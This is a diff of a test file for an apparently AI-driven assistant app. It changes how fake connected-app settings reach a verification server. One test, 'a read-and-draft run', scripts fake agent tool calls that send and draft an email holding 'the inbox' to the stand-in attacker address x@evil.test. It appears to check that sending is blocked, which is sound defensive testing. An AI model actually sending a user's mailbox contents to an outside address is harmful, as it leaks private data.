@@ -59,7 +59,7 @@ describe("MausBot keeps an eye on the day, hidden from the sidebar", () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     writeFileSync(markers, JSON.stringify({ "Your checks found what is below": WATCH_REPLY }));
-    fixture = await launchVerificationServer({ ...process.env, TZ: MIDDAY_ZONE, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token, FAKE_CLAUDE_MARKER_REPLIES: markers });
+    fixture = await launchVerificationServer({ ...process.env, ...apps.env, TZ: MIDDAY_ZONE, FAKE_CLAUDE_MARKER_REPLIES: markers });
     api = client(fixture);
     const bots = (await api("GET", "/api/bots")).bots as any[];
     const found = bots.find((bot) => bot.defaultBot && !bot.defaultBot.person);
@@ -199,7 +199,7 @@ describe("a read-and-draft run", () => {
     vi.spyOn(console, "warn").mockImplementation(() => {});
     apps = await startFakeConnectedApps();
     const multi = (slug: string, args: Record<string, unknown>) => ({ name: "COMPOSIO_MULTI_EXECUTE_TOOL", server: "composio", input: { tools: [{ tool_slug: slug, arguments: args }] } });
-    fixture = await launchVerificationServer({ ...process.env, OMB_COMPOSIO_BROKER_URL: apps.url, OMB_COMPOSIO_BROKER_TOKEN: apps.token,
+    fixture = await launchVerificationServer({ ...process.env, ...apps.env,
       FAKE_CLAUDE_TOOL_CALLS: JSON.stringify([
         multi("GMAIL_SEND_EMAIL", { recipient_email: "x@evil.test", body: "the inbox" }),
         multi("GMAIL_CREATE_EMAIL_DRAFT", { thread_id: "thread-important", recipient_email: "x@evil.test", body: "the inbox" }),
